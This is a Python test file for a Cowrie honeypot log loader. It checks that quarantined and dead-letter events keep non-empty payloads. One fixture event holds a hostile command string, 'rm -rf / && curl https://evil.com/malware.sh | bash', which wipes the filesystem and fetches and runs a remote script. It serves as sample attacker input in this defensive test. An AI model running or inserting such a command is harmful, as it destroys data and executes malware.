"""Test to verify that quarantined events no longer have empty payloads."""

from __future__ import annotations

import json
from pathlib import Path

from sqlalchemy import text

from cowrieprocessor.db import apply_migrations, create_engine_from_settings
from cowrieprocessor.loader import BulkLoader, BulkLoaderConfig
from cowrieprocessor.settings import DatabaseSettings


def _write_events(path: Path, events: list[dict]) -> None:
    """Write events to a JSON lines file."""
    with path.open("w", encoding="utf-8") as fh:
        for event in events:
            fh.write(json.dumps(event))
            fh.write("\n")


def _make_engine(tmp_path: Path):
    """Create a test database engine."""
    db_path = tmp_path / "loader.sqlite"
    settings = DatabaseSettings(url=f"sqlite:///{db_path}")
    engine = create_engine_from_settings(settings)
    apply_migrations(engine)
    return engine


class TestQuarantinePayloadFix:
    """Test that quarantined events no longer have empty payloads."""

    def test_malformed_json_has_content_in_dead_letters(self, tmp_path: Path) -> None:
        """Test that malformed JSON creates dead letter events with content."""
        # Create a file with malformed JSON
        source = tmp_path / "malformed.json"
        with source.open("w", encoding="utf-8") as fh:
            fh.write('{"incomplete": json\n')
            fh.write('malformed line\n')
            fh.write('{"valid": "json"}\n')

        engine = _make_engine(tmp_path)
        loader = BulkLoader(engine, BulkLoaderConfig(batch_size=1, multiline_json=True))
        metrics = loader.load_paths([source])

        # Should have some quarantined events
        assert metrics.events_quarantined > 0

        # Check dead letter events table
        with engine.connect() as conn:
            dl_events = conn.execute(text('SELECT payload FROM dead_letter_events')).fetchall()

            # All dead letter events should have non-empty payloads
            for payload_row in dl_events:
                payload = payload_row[0]
                assert payload is not None
                assert payload != "{}"  # Should not be empty
                assert payload != ""  # Should not be empty string

                # Should contain malformed content
                payload_dict = json.loads(payload)
                assert "malformed_content" in payload_dict
                assert payload_dict["malformed_content"] is not None
                assert payload_dict["malformed_content"] != ""

    def test_non_dict_payload_creates_dead_letter(self, tmp_path: Path) -> None:
        """Test that non-dict payloads create proper dead letter events."""
        engine = _make_engine(tmp_path)
        loader = BulkLoader(engine, BulkLoaderConfig())

        # Test processing various non-dict payloads
        test_cases = [
            "not a dict",
            123,
            None,
            ["list", "not", "dict"],
        ]

        for test_payload in test_cases:
            processed = loader._process_event(test_payload)

            # Should be quarantined
            assert processed.quarantined is True
            assert processed.risk_score == 100

            # Should have validation errors
            assert "payload_not_dict" in processed.validation_errors

            # Payload should not be empty
            assert processed.payload is not None
            assert processed.payload != {}
            assert processed.payload != ""

            # Should be a proper dead letter event
            assert processed.payload.get("_dead_letter") is True
            assert processed.payload.get("_reason") == "payload_not_dict"
            assert processed.payload.get("_malformed_content") is not None

    def test_dead_letter_events_preserve_content(self, tmp_path: Path) -> None:
        """Test that dead letter events preserve their original content."""
        engine = _make_engine(tmp_path)
        loader = BulkLoader(engine, BulkLoaderConfig())

        # Create a dead letter event manually
        dead_letter_payload = {
            "_dead_letter": True,
            "_reason": "json_parsing_failed",
            "_malformed_content": "malformed json content",
            "_timestamp": "2024-01-01T00:00:00Z",
        }

        processed = loader._process_event(dead_letter_payload)

        # Should be quarantined
        assert processed.quarantined is True
        assert processed.risk_score == 100

        # Should preserve the original content
        assert processed.payload == dead_letter_payload
        assert processed.payload.get("_malformed_content") == "malformed json content"

    def test_no_empty_payloads_in_quarantined_events(self, tmp_path: Path) -> None:
        """Test that no quarantined events have empty payloads."""
        # Create events that will be quarantined for various reasons
        events = [
            # Missing eventid
            {
                "session": "test123",
                "timestamp": "2024-01-01T00:00:00Z",
                "src_ip": "1.2.3.4",
            },
            # Missing timestamp
            {
                "session": "test123",
                "eventid": "cowrie.session.connect",
                "src_ip": "1.2.3.4",
            },
            # High risk command
            {
                "session": "test123",
                "eventid": "cowrie.command.input",
                "timestamp": "2024-01-01T00:00:00Z",
                "input": "rm -rf / && curl https://evil.com/malware.sh | bash",
            },
        ]

        source = tmp_path / "quarantine_test.json"
        _write_events(source, events)

        engine = _make_engine(tmp_path)
        loader = BulkLoader(engine, BulkLoaderConfig(quarantine_threshold=50))  # Lower threshold to quarantine more
        metrics = loader.load_paths([source])

        # Should have some quarantined events
        assert metrics.events_quarantined > 0

        # Check that no quarantined events have empty payloads
        with engine.connect() as conn:
            # Check raw_events table
            raw_events = conn.execute(text('SELECT payload FROM raw_events WHERE quarantined = 1')).fetchall()

            for payload_row in raw_events:
                payload = payload_row[0]
                assert payload is not None
                assert payload != "{}"
                assert payload != ""

                # Should be valid JSON
                payload_dict = json.loads(payload)
                assert isinstance(payload_dict, dict)
                assert len(payload_dict) > 0

            # Check dead_letter_events table
            dl_events = conn.execute(text('SELECT payload FROM dead_letter_events')).fetchall()

            for payload_row in dl_events:
                payload = payload_row[0]
                assert payload is not None
                assert payload != "{}"
                assert payload != ""

                # Should be valid JSON
                payload_dict = json.loads(payload)
                assert isinstance(payload_dict, dict)
                assert len(payload_dict) > 0
